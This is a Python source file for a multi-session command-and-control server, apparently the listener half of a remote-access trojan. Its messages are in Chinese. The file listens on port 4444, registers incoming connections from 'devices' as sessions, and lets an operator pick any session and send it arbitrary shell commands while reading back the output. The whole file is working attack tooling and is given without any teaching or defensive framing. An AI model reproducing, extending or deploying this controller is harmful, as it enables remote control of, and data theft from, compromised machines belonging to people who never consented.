import socket
import threading
import sys
import struct
import json

class UniversalMaster:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.counter = 1
        self.lock = threading.Lock()

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(15)
        print(f"[*] 全平台通用服务端已启动，监听端口: {self.port}")

        threading.Thread(target=self._accept_loop, args=(server,), daemon=True).start()
        self._console()

    def _accept_loop(self, server_socket):
        while True:
            try:
                client_socket, address = server_socket.accept()
                with self.lock:
                    sid = self.counter
                    self.sessions[sid] = (client_socket, address)
                    self.counter += 1
                print(f"\n[+] 新设备上线! 会话 ID: {sid} | 来源: {address[0]}:{address[1]}")
                print("Universal-Master > ", end="", flush=True)
            except Exception:
                break

    def _console(self):
        while True:
            cmd = input("Universal-Master > ").strip()
            if not cmd:
                continue
            
            parts = cmd.split(" ")
            action = parts[0].lower()

            if action == 'sessions':
                with self.lock:
                    print("\n--- 在线设备列表 ---")
                    for sid, (s, addr) in self.sessions.items():
                        print(f"ID: {sid} | IP: {addr[0]}:{addr[1]}")
                    print("--------------------\n")
            elif action == 'interact':
                if len(parts) < 2:
                    print("[-] 请指定会话 ID")
                    continue
                try:
                    sid = int(parts[1])
                    with self.lock:
                        if sid in self.sessions:
                            client_socket, _ = self.sessions[sid]
                        else:
                            print("[-] 无效的会话 ID")
                            continue
                    self._session_menu(client_socket, sid)
                except ValueError:
                    print("[-] ID 必须为数字")
            elif action == 'exit':
                sys.exit(0)

    def _session_menu(self, client_socket, sid):
        print(f"\n[*] 已进入设备 {sid} 的交互界面。输入 'back' 返回主菜单。")
        while True:
            try:
                command = input(f"Device({sid}) > ").strip()
                if not command:
                    continue
                if command.lower() == 'back':
                    break

                # 包装为 JSON 发送，确保跨平台解析绝对不出错
                payload = json.dumps({"command": command}).encode('utf-8')
                client_socket.sendall(struct.pack('!I', len(payload)) + payload)

                length_data = client_socket.recv(4)
                if not length_data:
                    print("[-] 目标设备连接已断开。")
                    break
                msg_length = struct.unpack('!I', length_data)[0]

                data = b""
                while len(data) < msg_length:
                    packet = client_socket.recv(msg_length - len(data))
                    if not packet:
                        break
                    data += packet

                print(data.decode('utf-8', errors='ignore'))

            except Exception as e:
                print(f"[-] 通信异常: {e}")
                with self.lock:
                    if sid in self.sessions:
                        del self.sessions[sid]
                break

if __name__ == '__main__':
    UniversalMaster().start()